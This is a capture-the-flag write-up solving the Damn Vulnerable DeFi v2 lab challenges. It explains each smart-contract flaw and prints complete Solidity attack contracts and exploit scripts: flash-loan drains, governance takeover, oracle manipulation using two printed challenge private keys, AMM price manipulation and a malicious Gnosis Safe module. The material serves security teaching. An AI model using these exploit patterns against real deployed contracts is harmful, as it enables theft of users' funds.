![](cover.png)

# Solutions - Damn Vulnerable DeFi v2

Creator [@tinchoabbate](https://twitter.com/tinchoabbate)  
Website [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/)  
Github [repository](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0)

# Index

1 - [Unstoppable](#1---Unstoppable)  
2 - [Naive Receiver](#2---Naive-Receiver)  
3 - [Truster](#3---Truster)  
4 - [Side Entrance](#4---Side-Entrance)  
5 - [The Rewarder](#5---The-Rewarder)  
6 - [Selfie](#6---Selfie)  
7 - [Compromised](#7---Compromised)  
8 - [Puppet](#8---Puppet)  
9 - [Puppet v2](#9---Puppet-v2)  
10 - [Free Rider](#10---Free-Rider)  
11 - [Backdoor](#11---Backdoor)  
12 - [Climber](#12---Climber)

## 1 - Unstoppable

The goal of this challenge is to disable flash loan lender contract. We are looking for a DoS attack.

Vulnerability is located inside **flashLoan()** function in **UnstoppableLender.sol** :

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
  require(borrowAmount > 0, "Must borrow at least one token");

  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
  require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

  // Ensured by the protocol via the `depositTokens` function
  assert(poolBalance == balanceBefore);

  damnValuableToken.transfer(msg.sender, borrowAmount);

  IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

  uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
  require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

In order to disable the contract from offering flash loans, we need to break one of the 4 safety checks inside the function.

Particiullary interesting one:

```solidity
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

The assert statement is making sure that the contract balance of the DVT token (`balanceBefore`) is matching the inner contract logic balance (`poolBalance`) that is updated when user deposits tokens using the `depositTokens` function.

It assumes that no external transfers will occur, which is a flawed assumption.

We can exploit this by transferring DVT tokens to contract with the ERC20 `transfer` function.

Solution code:

**unstoppable.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
// ...
```

## 2 - Naive Receiver

This challenge might be tricky at first. The goal is not to attack the lender, rather we need to drain funds from the receiver even though the vulnerability is inside the lender's contract.

**NaiveReceiverLenderPool.sol** is offering flash loans, but it always takes a constant fee of **1 ether**.
There is nothing wrong with the contract's logic, but the way it offers flash loans is not very secure.

As we can see from the `flashLoan()` function:

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

    require(borrower.isContract(), "Borrower must be a deployed contract");
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            "receiveEther(uint256)",
            FIXED_FEE
        ),
        borrowAmount
    );

    require(
        address(this).balance >= balanceBefore + FIXED_FEE,
        "Flash loan hasn't been paid back"
    );
}
```

It's clear that the caller is specifying an address of the borrower as a paramater. So, we can call the `flashLoan()` and specify **flashLoanReceiver.sol**'s address as the borrower, calling it 10 times would be enough to drain all funds from the receiver since 1 loan costs 1 ether in fees.

We will make a new **NaiveReceiverAttack.sol** contract that will essentially call the `flashLoan()` 10 times with **flashLoanReceiver.sol**'s address as borrower paramater.

Solution code:

**NaiveReceiverAttack.sol :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool immutable pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) external {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}

```

**naive-receiver.challenge.js :**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'NaiveReceiverAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);
  await attackContract.attack(this.receiver.address);
});
// ...
```

## 3 - Truster

Again, we have a flash loan lender contract. The goal is to drain all the funds from the pool. It offers flash loans for free but has one big flaw.

Here is the main function:

```solidity
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

As we can see logic seems fine, but the `target` parameter and this line of code are critical to understanding:

```solidity
target.functionCall(data);
```

It is a very vulnerable external call. Essentially, the pool is making a call to the `target` contract that **we** specify and it calls a function that **we** specify with the `data` parameter. Basically, we can forward this call to any contract function with `msg.sender` being **pool** contract.

More specifically we will call **ERC20** token `approve` function and approve ourselves as spender of all pool's tokens. In order to perform this hack in one transaction we will make a new **TrusterAttack.sol** contract that will make a malicious loan (approve its address as pool tokens spender) and transfer all tokens from the pool in the same function call.

Solution code:

**TrusterAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {
    TrusterLenderPool immutable pool;
    IERC20 immutable token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        pool.flashLoan(borrowAmount, borrower, target, data);
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
```

**truster.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE  */
  const AttackFactory = await ethers.getContractFactory(
    'TrusterAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.pool.address,
    this.token.address
  );

  const amount = 0;
  const borrower = attacker.address;
  const target = this.token.address;
  const abi = ['function approve(address spender, uint256 amount)'];
  const iface = new ethers.utils.Interface(abi);
  const data = iface.encodeFunctionData('approve', [
    attackContract.address,
    TOKENS_IN_POOL,
  ]);

  await attackContract.attack(amount, borrower, target, data);
});
// ...
```

## 4 - Side Entrance

This time our flash loan lender comes with additional functionality. It acts as a vault, so basically, anyone can deposit their ether and withdraw at any time. Stacked ether is used to lend flash loans with no extra fees.

We will exploit this contract by taking advantage of insecure accounting logic. Let's take a look at the `flashLoan` function.

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= amount, "Not enough ETH in balance");

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
}
```

Two requirements seem fine at first, but one scenario hasn't been accounted for. Once we receive the flash loan, nothing prevents us from returning the loan with the pool's `deposit` function. That way, inside the pool's accounting, we are the owners of deposited funds. The pool balance stayed the same, but inner logic is broken and we are able to withdraw everything.

For the solution, we will create a new **SideEntranceAttack.sol** contract and implement the exploit.

Solution code:

**SideEntranceAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool immutable pool;
    address immutable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack(uint amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}
```

**side-entrance.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'SideEntranceAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);

  await attackContract.attack(ETHER_IN_POOL);
});
// ...
```

## 5 - The Rewarder

The Rewarder challenge stepped up in complexity from previous challenges, it might be intimidating at first. We have 2 pools, **FlashLoanerPool.sol** offering flash loans, **TheRewarderPool.sol** offering reward tokens every 5 days to those who deposit DVT tokens. The goal is to win the majority of rewards.

To beat the challenge we must own the majority of deposited reward pool liquidity tokens, and flash loan contract offers loans in... you guessed it, DVT liquidity tokens!

**AccountingToken.sol** is used inside the Reward pool for inside accounting logic to track who deposited what amount etc.

Let's take a look at **TheRewarderPool.sol**'s `deposit` function:

```solidity
function deposit(uint256 amountToDeposit) external {
    require(amountToDeposit > 0, "Must deposit tokens");

    accToken.mint(msg.sender, amountToDeposit);
    distributeRewards();

    require(
        liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
    );
}
```

As we can see pool distributes rewards each time we deposit liquidity tokens. The condition is though, it must have been 5 days from the last time since you can get rewards once per round and each round lasts 5 days.

Finally, we will exploit this `deposit` function with the flash loan from **FlashLoanerPool.sol**. We can deposit the loan in **TheRewarderPool.sol** and get most of the rewards. Once we receive rewards, we will withdraw tokens and pay back the loan to the lender.

To interact with the flash loan lender we need a smart contract that will orchestrate the above logic.

Solution code:

**TheRewarderAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttack {
    FlashLoanerPool immutable loanPool;
    TheRewarderPool immutable rewardPool;
    DamnValuableToken immutable liqToken;
    address payable immutable owner;

    constructor(address _loanPool, address _rewardPool, address _liqToken) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        liqToken = DamnValuableToken(_liqToken);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liqToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        liqToken.transfer(address(loanPool), amount);

        uint256 balance = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, balance);
    }
}
```

**the-rewarder.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'TheRewarderAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.flashLoanPool.address,
    this.rewarderPool.address,
    this.liquidityToken.address
  );
  // wait 5 days for new round
  await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]);

  await attackContract.attack(TOKENS_IN_LENDER_POOL);
});
// ...
```

## 6 - Selfie

The goal of this challenge is to drain all funds from **SelfiePool.sol**. It looks kind of obvious here:

```solidity
function drainAllFunds(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit FundsDrained(receiver, amount);
}
```

The tricky part is to pass the `onlyGovernance` modifier that requires the transaction sender to be **SimpleGovernance.sol** contract. The governance contract is designed in a way that anyone can submit an action (transaction) and execute it if the action caller has enough votes. What it actually means is that we have to own more than half of the total token supply. That is easy since we have a lender that offers 75% of the whole supply in flash loans.

So, to exploit this we will need a new **SelfieAttack.sol** contract. It will request the flash loan and queue an action that calls **SelfiePool.sol's** `drainAllFunds`. After paying back the loan, we will wait for queued action to be available for execution since the contract requires that at least 2 days have passed.

Solution code:

**SelfieAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool immutable pool;
    DamnValuableTokenSnapshot immutable governanceToken;
    address immutable owner;

    constructor(address _pool, address _governanceToken) {
        pool = SelfiePool(_pool);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
        owner = msg.sender;
    }

    function attack() external {
        uint256 amount = pool.token().balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        governanceToken.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        governanceToken.transfer(address(pool), amount);
    }
}
```

**selfie.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'SelfieAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.pool.address,
    this.token.address
  );
  await attackContract.attack();

  await ethers.provider.send('evm_increaseTime', [2 * 24 * 3600]);

  await this.governance.connect(attacker).executeAction(1);
});
```

## 7 - Compromised

The solution to this challenge is a little bit random, I find it very confusing especially for beginners. It doesn't look like real life scenario, but it teaches you some new things, so let's get into it.

Firstly let's see the contracts. The main contract is **Exchange.sol**, it has simple utility, you can buy and sell NFT for a price that is determined inside **TrustfulOracle.sol**. So, most likely we will manipulate the price somehow. The goal is to drain all funds from the exchange, we start with 0.01 eth. Now, if you take a closer look at **TrustfulOracle.sol**, the way it works is that in order to set the price you must have a special role. There is no obvious way to get that role since it's initialized in the constructor. But, if you have looked at official instructions for this level on [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/), you would've noticed a bunch of random confusing numbers.

As it turns out those are the 2 encoded private keys. You can decode them like this: HEX => ascii, ascii => base64. As a matter of fact those are the 2 private keys from trusted oracles, so we just need to find a way how to turn those keys in a signer wallet with ethers.js and manipulate the price inside **TrustfulOracle.sol**. Firstly we'll set the price very low to buy, and then we'll set it to the whole balance of exchange so that once we sell we get all the funds.

Solution code:

**compromised.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const key1 =
    '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
  const key2 =
    '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

  const oracle1 = new ethers.Wallet(key1, ethers.provider);
  const oracle2 = new ethers.Wallet(key2, ethers.provider);

  const orc1Trust = this.oracle.connect(oracle1);
  const orc2Trust = this.oracle.connect(oracle2);

  const setMedianPrice = async (amount) => {
    await orc1Trust.postPrice('DVNFT', amount);
    await orc2Trust.postPrice('DVNFT', amount);
  };

  let priceToSet = ethers.utils.parseEther('0.01');
  await setMedianPrice(priceToSet);

  const attackExchange = this.exchange.connect(attacker);
  const attackNFT = this.nftToken.connect(attacker);

  await attackExchange.buyOne({ value: priceToSet });

  const tokenId = 0;

  const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
  priceToSet = balOfExchange;
  await setMedianPrice(priceToSet);

  await attackNFT.approve(attackExchange.address, tokenId);
  await attackExchange.sellOne(tokenId);

  priceToSet = INITIAL_NFT_PRICE;
  await setMedianPrice(priceToSet);
});
```

## 8 - Puppet

Now, this challenge might look math intensive at first, but it's critical to understand these concepts because they are the backbone of DEXs that utilize AMMs. Essentially we will solve the challenge with market manipulation. We will take advantage of the low liquidity inside the Uniswap DVT pool.

The main contract is **PuppetPool.sol** which we need to drain funds from. To get all DVT tokens from the pool, we have to strongly devalue DVT tokens so that the required ETH deposit as collateral gets really low. Collateral is calculated based on the DVT price that comes from the UniSwap contract deployed earlier in the test.

I wrote some comments inside the solution script to help you understand what's going on. Long story short, UniSwap exchange for DVT token calculates the 'price' of DVT based on the ratio supplied in the pool. If there is a lot of DVT and less ETH, ETH becomes very valuable compared to DVT, and vice versa.

The main formula that drives this behavior is: `X * Y = k`  
`X` is amount of ERC20 token (**DVT**)  
`Y` is amount of ETH  
`k` is the **constant** product, meaning that ratio will change in order to satisfy the product

I encourage you to do your own research on AMMs and UniSwap v1 for better understanding.

Now, for the solution. Firstly we will deposit all available **DVT** in UniSwap exchange to strongly devalue the price. We will get around **9.9 ETH** for supplied DVT.
Then, we will be able to borrow 100k DVT from **PuppetPool.sol** by supplying just around 18 ETH as collateral. We can get 1000 DVT back from UniSwap exchange by depositing around 10 ETH.

Solution code:

**puppet.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  /**
   * AMM Formula: X * Y = k
   *
   * 1 - Devalue DVT by depositing 1000 tokens
   * 10 ETH : 10 DVT => k = 10 * 10 = 100
   * X ETH  : 1010 DVT => X = 100 / 1010 = 0.09901
   * We receive: 10 - 0.09901 = 9.90099 ETH
   *
   * 2 - borrow all DVT from the pool
   * 100000 DVT costs (0.09 / 1010) * 100000 * 2 = 17.8 ETH
   * We are left off with ~15 ETH + 100000 DVT
   *
   * 3 - put uniswap pool to original ratio
   * We put back 10 ETH which gives us 1000 DVT
   * Ratio: 10 ETH : 10 DVT
   */
  const attackPuppet = this.lendingPool.connect(attacker);
  const attackToken = this.token.connect(attacker);
  const attackUniSwap = this.uniswapExchange.connect(attacker);

  await attackToken.approve(
    attackUniSwap.address,
    ATTACKER_INITIAL_TOKEN_BALANCE
  );

  await attackUniSwap.tokenToEthSwapInput(
    ATTACKER_INITIAL_TOKEN_BALANCE,
    ethers.utils.parseEther('9'),
    (await ethers.provider.getBlock('latest')).timestamp * 2
  );

  const deposit = await attackPuppet.calculateDepositRequired(
    POOL_INITIAL_TOKEN_BALANCE
  );
  await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });

  const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
  const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack, {
    gasLimit: 1e6,
  });

  await attackUniSwap.ethToTokenSwapOutput(
    tokensToBuyBack,
    (await ethers.provider.getBlock('latest')).timestamp * 2,
    { value: ethReq }
  );
});
```

## 9 - Puppet v2

This challenge is very similar to the previous one, so I won't go in depth. The logic is exactly the same. It introduces UniSwap v2 contracts, so that might be interesting. Other than that, there is not much new happening.

The difference here is that there is no ETH/ERC20 pair, rather we have WETH/ERC20 pair. UniSwap v2 introduces ERC20/ERC20 pairs, and to make a cleaner codebase they only allow using Wrapped ETH (WETH) which is just an ERC20 representation of ETH.

To exploit this, we will follow the same logic from the 8. challenge (Puppet). Firstly, we deposit all available DVT in WETH/DVT pool to devalue it. Once that's done we will be able to borrow all funds from **PuppetV2Pool.sol**. But, there is a catch. We need to exchange ETH for WETH because the lender pool requires WETH. So once we have WETH we'll be able to borrow the whole DVT from **PuppetV2Pool.sol**.

Solution code:

**puppet-v2.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const attackWeth = this.weth.connect(attacker);
  const attackToken = this.token.connect(attacker);
  const attackRouter = this.uniswapRouter.connect(attacker);
  const attackLender = this.lendingPool.connect(attacker);

  await attackToken.approve(
    attackRouter.address,
    ATTACKER_INITIAL_TOKEN_BALANCE
  );
  await attackRouter.swapExactTokensForTokens(
    ATTACKER_INITIAL_TOKEN_BALANCE,
    ethers.utils.parseEther('9'),
    [attackToken.address, attackWeth.address],
    attacker.address,
    (await ethers.provider.getBlock('latest')).timestamp * 2
  );

  const deposit = await attackLender.calculateDepositOfWETHRequired(
    POOL_INITIAL_TOKEN_BALANCE
  );
  await attackWeth.approve(attackLender.address, deposit);

  const tx = {
    to: attackWeth.address,
    value: ethers.utils.parseEther('19.9'),
  };
  await attacker.sendTransaction(tx);

  await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
    gasLimit: 1e6,
  });
});
```

## 10 - Free Rider

Alright, stepping up in complexity with this challenge just a little bit. Let's see, we have 2 contracts: **FreeRiderNFTMarketplace.sol** and **FreeRiderBuyer.sol**. The goal is to buy 6 listed NFTs. So, once we buy them we will be rewarded with 45 ETH. Each NFT costs 15 ETH and our starting balance is 0.5 ETH.

The first thing that comes to mind is the flash loan of course. But it can't work because we won't be able to repay the loan even if we get the 45 ETH reward since all NFTs will cost 90 ETH. Or no? Let's see the `_buyOne` function:

```solidity
  function _buyOne(uint256 tokenId) private {
      uint256 priceToPay = offers[tokenId];
      require(priceToPay > 0, "Token is not being offered");

      require(msg.value >= priceToPay, "Amount paid is not enough");

      amountOfOffers--;

      // transfer from seller to buyer
      token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

      // pay seller
      payable(token.ownerOf(tokenId)).sendValue(priceToPay);

      emit NFTBought(msg.sender, tokenId, priceToPay);
  }
```

You could notice that contract pays the seller **after** it transfers NFT. That's wrong, basically, it gives back money to the buyer. We can easily exploit this, in `buyMany` which essentially calls `_buyOne` many times. We can call it for all 6 NFTs at once. All we need to do is to supply 15 ETH to pass the first requirement:

```solidity
require(msg.value >= priceToPay, "Amount paid is not enough");
```

We'll be able to repay the flash loan since we got NFTs for free basically, the only thing we need to be careful about is to correctly convert WETH to ETH and vice versa since our UniSwapV2 pool offers only WETH. We will make a new **FreeRiderAttack.sol** contract that will perform this attack. First, we borrow the loan in WETH, then convert it to ETH and buy 6 NFTs "for free". Once we have NFTs, we transfer them to **FreeRiderBuyer.sol** to get the reward and all we need to do is to convert enough ETH to WETH to repay the loan.

Solution code:

**FreeRiderAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address payable immutable weth;
    address immutable dvt;
    address immutable factory;
    address payable immutable buyerMarketplace;
    address immutable buyer;
    address immutable nft;

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _buyerMarketplace,
        address _buyer,
        address _nft
    ) {
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        buyerMarketplace = _buyerMarketplace;
        buyer = _buyer;
        nft = _nft;
    }

    function flashSwap(address _tokenBorrow, uint256 _amount) external {
        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "!pair init");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        require(msg.sender == pair, "!pair");
        require(sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));

        tokenBorrow.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", currBal)
        );

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
            tokenIds
        );

        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        (bool success, ) = weth.call{value: 15.1 ether}("");
        require(success, "failed to deposit weth");

        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```

**free-rider.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const attackWeth = this.weth.connect(attacker);
  const attackToken = this.token.connect(attacker);
  const attackFactory = this.uniswapFactory.connect(attacker);
  const attackMarketplace = this.marketplace.connect(attacker);
  const attackBuyer = this.buyerContract.connect(attacker);
  const attackNft = this.nft.connect(attacker);

  const AttackFactory = await ethers.getContractFactory(
    'FreeRiderAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    attackWeth.address,
    attackFactory.address,
    attackToken.address,
    attackMarketplace.address,
    attackBuyer.address,
    attackNft.address
  );

  await attackContract.flashSwap(attackWeth.address, NFT_PRICE, {
    gasLimit: 1e6,
  });
});
```

## 11 - Backdoor

This one's tough. I suggest you to do research about GnosisSafe wallets and proxy contracts before attempting or even reading this.
So initially there is a team of 4 people using some kind of wallet registry (**WalletRegistry.sol**) that is used to create more secure wallets. As a reward, each team member will get 10 DVT tokens once they create their GnosisSafe wallet. **WalletRegistry.sol** just makes some security checks before handing them the tokens to the wallet. It allows each team member to create a wallet only once.

The way this works is the following. A user has to create an instance of **GnosisSafeProxy.sol** with **GnosisSafeProxyFactory.sol** contract. The logic implementation of the wallet is stored in a contract called **Singleton**. It's an instance of the **GnosisSafe.sol** contract and it's deployed only once for all GnosisSafe wallets. That's possible due to the proxy design pattern, so the only thing that you deploy once you create the wallet is the **GnosisSafeProxy.sol** that will basically `delegatecall` to the implementation contract (singleton) all function calls. The state is stored in the proxy. Now, this all might sound confusing and it should. It took me a few hours of watching different videos and reading articles to fully grasp how it all works. Once you fully comprehend the design of these contracts continue because the exploit is not easy to understand as well at first.

There is a special functionality inside GnosisSafe contracts that allows you to add so-called Modules on top of the wallet. It's made to allow more flexibility and functionality. But that's exactly where vulnerability comes in. The problem with this is that once we initialize the wallet, it allows you to delegatecall to an arbitrary contract (module) with arbitrary data. What it means is that if you deploy your wallet through some malicious third-party website, it can basically install a "backdoor" on your wallet and control your funds. For us, this is not the exact exploit, but it's very similar. Since no member of the team deployed a wallet, we can take advantage of it. We will initialize their wallets and approve us for the wallet's DVT with our malicious module (because the wallet will delegatecall our module), so once they receive it we can send it to us. This is the concept and explanation on a very high level, I will share the solution code below.

We need to make a new **BackdoorAttack.sol** module contract. It will have `setupTokens()` and `exploit()` functions. First, one will be called with delegatecall once the wallet proxy is initialized and the second is the starting point of the exploit. That's the function we will call, it will loop through the team, and for each member, it will deploy a new wallet using the `createProxyWithCallback()` function inside **GnosisSafeProxyFactory.sol**. That will initiate the callback that we specify (**WalletRegistry.sol** `proxyCreated()`) function. Once the wallet registry sends the tokens we will just transfer them to us and that's the whole exploit.

Solution code:

**BackdoorAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttack {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    function setupToken(address _tokenAddress, address _attacker) external {
        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
    }

    function exploit(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1),
                address(this),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }
}
```

**backdoor.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const attackToken = this.token.connect(attacker);
  const attackFactory = this.walletFactory.connect(attacker);
  const attackMasterCopy = this.masterCopy.connect(attacker);
  const attackWalletRegistry = this.walletRegistry.connect(attacker);

  const AttackFactory = await ethers.getContractFactory(
    'BackdoorAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    attacker.address,
    attackFactory.address,
    attackMasterCopy.address,
    attackWalletRegistry.address,
    attackToken.address
  );

  const moduleABI = ['function setupToken(address,address)'];
  const moduleIface = new ethers.utils.Interface(moduleABI);
  const setupData = moduleIface.encodeFunctionData('setupToken', [
    attackToken.address,
    attackContract.address,
  ]);

  await attackContract.exploit(users, setupData);
});
```

## 12 - Climber

For the last challenge, we have the Climber. It's not easy, but we'll get through it. Alright, let's see the code. We have **ClimberVault.sol** contract that acts as a vault that can distribute tokens to a given address (maximum 1 ether every 15 days). But, you can call the function only if you are the owner of the contract. The real owner is actually **ClimberTimelock.sol** contract. Besides that, the vault has a `sweepFunds()` function that allows you to sweep all the funds, but only if you have the sweeper role. Sweeper and Owner are set in the constructor (initializer). It's worth noting that this challenge is another proxy design pattern called UUPS. All this means is that proxy owner upgradeability functionalities are stored inside the implementation contract.

